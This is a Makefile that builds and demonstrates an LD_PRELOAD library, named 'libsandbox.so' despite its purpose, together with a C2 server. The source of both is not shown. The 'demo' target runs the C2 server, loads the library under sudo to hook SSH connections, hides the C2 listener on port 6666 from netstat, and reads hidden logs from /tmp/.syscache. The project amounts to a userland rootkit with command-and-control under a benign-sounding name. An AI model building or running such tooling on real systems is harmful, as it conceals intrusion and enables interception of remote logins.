CC := gcc
CFLAGS := -Wall -Wextra -O2
PICFLAGS := -fPIC
LDFLAGS := -shared

SRC_LIB := src/sandbox_preload.c
LIB := build/libsandbox.so
TEST_SRC := test/test_open.c
TEST_BIN := build/test_open
C2_SRC := src/c2_server.c
C2_BIN := build/c2_server

.PHONY: all lib test c2 debug clean run preload_run demo

all: $(LIB) $(TEST_BIN) $(C2_BIN)

$(LIB): $(SRC_LIB) | build
	$(CC) $(CFLAGS) $(PICFLAGS) $(LDFLAGS) -o $@ $<

$(TEST_BIN): $(TEST_SRC) | build
	$(CC) $(CFLAGS) -o $@ $<

$(C2_BIN): $(C2_SRC) | build
	$(CC) $(CFLAGS) -pthread -o $@ $<

lib: $(LIB)
test: $(TEST_BIN)
c2: $(C2_BIN)

debug: CFLAGS += -g -O0 -fsanitize=address,undefined -fno-omit-frame-pointer
debug: clean all

run: $(TEST_BIN)
	./$(TEST_BIN)

preload_run: $(LIB) $(TEST_BIN)
	sudo LD_PRELOAD=$(LIB) ./$(TEST_BIN)

demo: $(LIB) $(TEST_BIN) $(C2_BIN)
	@echo "=== LD_PRELOAD demo ==="
	@echo "1. Starting C2 server in the background..."
	$(C2_BIN) &
	C2_PID=$$! ; sleep 2
	@echo "2. Testing file blocking..."
	sudo LD_PRELOAD=$(LIB) ./$(TEST_BIN)
	@echo "3. Testing SSH hook (connecting to localhost:22)..."
	sudo LD_PRELOAD=$(LIB) nc localhost 22 || true
	@sleep 1
	@echo "4. Testing netstat visibility..."
	@echo "   WITHOUT preload:"
	netstat -tlnp | grep 6666 || echo "   [C2 visible]"
	@echo "   WITH preload:"
	sudo LD_PRELOAD=$(LIB) netstat -tlnp | grep 6666 || echo "   [C2 hidden]"
	@echo "5. Hidden logs (if any):"
	@cat /tmp/.syscache || echo "   [no logs]"
	@kill $$C2_PID 2>/dev/null || true
	@echo "Demo finished."

build:
	mkdir -p build

clean:
	rm -rf build /tmp/.syscache
